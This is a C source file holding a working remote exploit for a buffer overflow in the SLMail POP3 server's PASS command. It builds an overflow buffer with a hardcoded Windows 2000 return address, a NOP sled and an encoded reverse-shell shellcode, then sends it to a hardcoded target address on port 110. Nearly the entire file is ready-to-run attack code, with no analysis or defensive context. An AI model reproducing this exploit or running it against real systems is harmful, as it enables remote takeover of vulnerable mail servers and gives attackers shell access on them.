#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#define retadd "\x63\x79\x4b\x5f" /*win2k server sp4 0x773a459f*/
#define port 110

/* revshell العراق القراصنة المجموعة*/
char shellcode[] =
"\xdb\xd9\xb8\xd1\x46\x0e\xe6\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x83\xc2\x04\x31\x42\x13\x03\x93\x55\xec\x13\xef\xb2\x72"
"\xdb\x0f\x43\x13\x55\xea\x72\x13\x01\x7f\x24\xa3\x41\x2d\xc9"
"\x48\x07\xc5\x5a\x3c\x80\xea\xeb\x8b\xf6\xc5\xec\xa0\xcb\x44"
"\x6f\xbb\x1f\xa6\x4e\x74\x52\xa7\x97\x69\x9f\xf5\x40\xe5\x32"
"\xe9\xe5\xb3\x8e\x82\xb6\x52\x97\x77\x0e\x54\xb6\x26\x04\x0f"
"\x18\xc9\xc9\x3b\x11\xd1\x0e\x01\xeb\x6a\xe4\xfd\xea\xba\x34"
"\xfd\x41\x83\xf8\x0c\x9b\xc4\x3f\xef\xee\x3c\x3c\x92\xe8\xfb"
"\x3e\x48\x7c\x1f\x98\x1b\x26\xfb\x18\xcf\xb1\x88\x17\xa4\xb6"
"\xd6\x3b\x3b\x1a\x6d\x47\xb0\x9d\xa1\xc1\x82\xb9\x65\x89\x51"
"\xa3\x3c\x77\x37\xdc\x5e\xd8\xe8\x78\x15\xf5\xfd\xf0\x74\x92"
"\x32\x39\x86\x62\x5d\x4a\xf5\x50\xc2\xe0\x91\xd8\x8b\x2e\x66"
"\x1e\xa6\x97\xf8\xe1\x49\xe8\xd1\x25\x1d\xb8\x49\x8f\x1e\x53"
"\x89\x30\xcb\xf4\xd9\x9e\xa4\xb4\x89\x5e\x15\x5d\xc3\x50\x4a"
"\x7d\xec\xba\xe3\x14\x17\x2d\xcc\x41\x2f\xae\xa4\x93\x4f\xb1"
"\x8f\x1d\xa9\xdb\xff\x4b\x62\x74\x99\xd1\xf8\xe5\x66\xcc\x85"
"\x26\xec\xe3\x7a\xe8\x05\x89\x68\x9d\xe5\xc4\xd2\x08\xf9\xf2"
"\x7a\xd6\x68\x99\x7a\x91\x90\x36\x2d\xf6\x67\x4f\xbb\xea\xde"
"\xf9\xd9\xf6\x87\xc2\x59\x2d\x74\xcc\x60\xa0\xc0\xea\x72\x7c"
"\xc8\xb6\x26\xd0\x9f\x60\x90\x96\x49\xc3\x4a\x41\x25\x8d\x1a"
"\x14\x05\x0e\x5c\x19\x40\xf8\x80\xa8\x3d\xbd\xbf\x05\xaa\x49"
"\xb8\x7b\x4a\xb5\x13\x38\x7a\xfc\x39\x69\x13\x59\xa8\x2b\x7e"
"\x5a\x07\x6f\x87\xd9\xad\x10\x7c\xc1\xc4\x15\x38\x45\x35\x64"
"\x51\x20\x39\xdb\x52\x61";

struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("192.168.56.5");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
